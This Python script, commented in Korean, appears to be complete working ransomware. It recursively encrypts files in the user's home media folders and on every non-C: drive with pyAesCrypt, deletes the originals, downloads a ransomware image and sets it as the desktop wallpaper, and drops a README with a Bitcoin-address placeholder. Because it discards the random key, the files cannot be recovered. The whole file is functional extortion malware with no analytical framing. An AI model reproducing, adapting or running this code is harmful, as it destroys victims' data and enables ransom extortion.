import sys
import os
import re
import string
import random
import pyAesCrypt
import getpass
import ctypes
import requests

# 사용자의 홈폴더 + @경로를 선언
specialTargetBase = os.path.expanduser('~')
specialTarget = [os.path.join(specialTargetBase, "Desktop"),
                 os.path.join(specialTargetBase, "Documents"),
                 os.path.join(specialTargetBase, "Movies"),
                 os.path.join(specialTargetBase, "Music"),
                 os.path.join(specialTargetBase, "Pictures")]

# targetFile variable
drives = re.findall(r"[A-Z]+:.*$", os.popen("mountvol /").read(), re.MULTILINE)

# target ComputerSystem variable
username = getpass.getuser()

# Keygen


def createKey():
    string_pool = string.ascii_letters + string.digits
    key = ''
    keyLength = 12
    for i in range(keyLength):
        key += random.choice(string_pool)
    return key


# encrypt variable
bufferSize = 64 * 1024
password = createKey()


def encryptFile(dirname):
    try:
        filenames = os.listdir(dirname)
        for filename in filenames:
            full_filename = os.path.join(dirname, filename)
            if os.path.isdir(full_filename):
                encryptFile(full_filename)
                print(full_filename)
            else:
                ext = os.path.splitext(full_filename)[-1]
                if ext != ".exe" and ext != ".locked":
                    # print(full_filename)
                    # Encrypt
                    pyAesCrypt.encryptFile(
                        full_filename, full_filename + ".locked", password, bufferSize)
                    os.remove(full_filename)
                else:
                    pass
    except:
        pass


def encryptSystem():
    for drive in drives:
        if drive != "C:\\":
            encryptFile(drive)
    for drive in specialTarget:
        encryptFile(drive)


def createReadmeFile():
    f = open(os.path.join(os.path.join(os.path.join(os.path.expanduser(
        '~')), 'Desktop'), "README.txt"), mode='w', encoding="utf-8")
    f.write("비트코인 주소")
    f.close()
    os.system(os.path.join(os.path.join(os.path.join(
        os.path.expanduser('~')), 'Desktop'), "README.txt"))


def setBackgroundIMG():
    bgImgPath = os.path.join(os.path.realpath(
        os.path.dirname(__file__)), "background.png")
    bgImgURL = "https://www.kaspersky.com/content/en-global/images/repository/isc/2017-images/Ransomware-attacks-2017.jpg"
    with open(bgImgPath, "wb") as file:
        response = requests.get(bgImgURL)
        file.write(response.content)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, bgImgPath, 0)


encryptSystem()
setBackgroundIMG()
createReadmeFile()
del password
